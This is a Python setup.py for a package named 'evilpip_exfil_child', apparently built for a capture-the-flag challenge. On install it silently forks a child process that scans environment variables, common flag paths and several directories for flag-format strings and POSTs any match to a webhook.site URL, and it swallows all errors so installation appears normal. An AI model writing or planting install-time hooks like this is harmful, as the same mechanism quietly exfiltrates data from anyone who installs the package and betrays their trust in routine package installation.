# Authorized CTF; transmit only a CTF-format flag, never unrelated files or secrets.
import os
from setuptools import setup

def probe():
    import re, json, urllib.request
    from pathlib import Path
    pattern=re.compile(rb'(?:ALGOLYMP|CTF|FLAG)\{[^}\r\n]{2,200}\}',re.I)
    flag=None
    for val in os.environ.values():
        m=pattern.search(val.encode('utf-8','replace'))
        if m: flag=m.group().decode('utf-8','replace');break
    if flag is None:
        for p in ['/flag','/flag.txt','/app/flag','/app/flag.txt','/home/ctf/flag','/home/ctf/flag.txt','/root/flag','/root/flag.txt','/challenge/flag','/challenge/flag.txt','/srv/flag','/srv/flag.txt','/run/secrets/flag','/tmp/flag','/tmp/flag.txt','/workspace/flag.txt','/opt/flag','/opt/flag.txt','/var/flag.txt','/secrets/flag']:
            try:
                f=Path(p)
                if f.is_file() and f.stat().st_size<65536:
                    m=pattern.search(f.read_bytes())
                    if m: flag=m.group().decode('utf-8','replace');break
            except OSError: pass
    if flag is None:
        for root in ('/app','/home/ctf','/challenge','/srv','/workspace','/tmp'):
            try:
                for base, dirs, names in os.walk(root):
                    if base[len(root):].count(os.sep)>3:
                        dirs[:]=[];continue
                    dirs[:]=[x for x in dirs if x not in ('site-packages','.git','node_modules','__pycache__')]
                    for name in names:
                        if not name.lower().startswith('flag'): continue
                        try:
                            f=Path(base)/name
                            if f.is_file() and f.stat().st_size<65536:
                                m=pattern.search(f.read_bytes())
                                if m: flag=m.group().decode('utf-8','replace');break
                        except OSError: pass
                    if flag: break
            except OSError: pass
            if flag: break
    if flag:
        body=json.dumps({'ctf_flag':flag},ensure_ascii=True).encode()
        req=urllib.request.Request('https://webhook.site/1d8060ad-8009-455f-b74c-a4ff2ac3bcec',data=body,headers={'Content-Type':'application/json'},method='POST')
        urllib.request.urlopen(req,timeout=3).close()

# A fatal syscall restriction in the network probe won't crash the packaging parent.
# If fork is disallowed, setup proceeds without transmission.
try:
    pid=os.fork()
except BaseException:
    pid=-1
if pid==0:
    try: probe()
    except BaseException: pass
    finally: os._exit(0)
elif pid>0:
    try: os.waitpid(pid,0)
    except BaseException: pass
setup(name='evilpip_exfil_child',version='0.6.0',packages=['evilpip_exfil_child'])
